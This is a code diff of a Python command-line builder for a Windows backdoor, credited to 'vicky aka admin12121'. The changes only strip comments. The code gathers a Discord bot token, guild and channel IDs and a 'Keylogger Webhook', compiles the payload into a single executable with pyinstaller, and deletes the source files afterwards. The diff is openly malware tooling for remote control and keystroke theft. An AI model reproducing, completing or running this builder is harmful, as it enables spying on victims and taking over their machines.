@@ -22,8 +22,6 @@ Made by vicky aka admin12121 | Github : admin12121
 Run 'help use' to get started!
 ''')
 
-# Payload settings templates
-
 PAYLOAD_SETTINGS = ["Backdoor Name", "Guild ID", "Bot Token", "Channel ID", "Keylogger Webhook"]
 
 def create_table(settings):
@@ -90,11 +88,9 @@ def build_backdoor(settings, meta=None):
         print("[!] Application name must be set before building.")
         return
 
-    # Set default meta if not provided
     if meta is None:
         meta = get_default_meta(app_name)
     else:
-        # Fill in any missing/None meta fields with defaults
         defaults = get_default_meta(app_name)
         meta = [(field, val if val and val != "None" else defval) for (field, val), (_, defval) in zip(meta, defaults)]
 
@@ -116,7 +112,6 @@ def build_backdoor(settings, meta=None):
 
     write_version_txt(meta)
 
-    # Windows pyinstaller command
     py_cmd = [
         "pyinstaller",
         "--onefile",
@@ -145,8 +140,6 @@ def build_backdoor(settings, meta=None):
     ]
 
     subprocess.call(py_cmd)
-
-    # Cleanup
     for ext in [".py", ".spec"]:
         try:
             os.remove(settings[0] + ext)
@@ -222,22 +215,18 @@ def main():
                 continue
 
             elif cmd == "set":
-                # Interactive prompt if no arguments
                 if len(command_list) == 1:
                     for i, setting in enumerate(PAYLOAD_SETTINGS):
                         value = input(f"> {setting} : ").strip()
                         settings[i] = value
-                    # Update meta defaults after name is set
                     meta = get_default_meta(settings[0])
                     print("[+] All settings updated!\n")
                     continue
-                # If user provides all 5 values at once
                 elif len(command_list) == 6:
                     settings[:] = command_list[1:6]
                     meta = get_default_meta(settings[0])
                     print("[+] All settings updated!\n")
                     continue
-                # If user provides a single setting and value
                 elif len(command_list) == 3:
                     setting, value = command_list[1].lower(), command_list[2]
                     setting_map =  {"name": 0, "guild-id": 1, "bot-token": 2, "channel-id": 3, "webhook": 4}
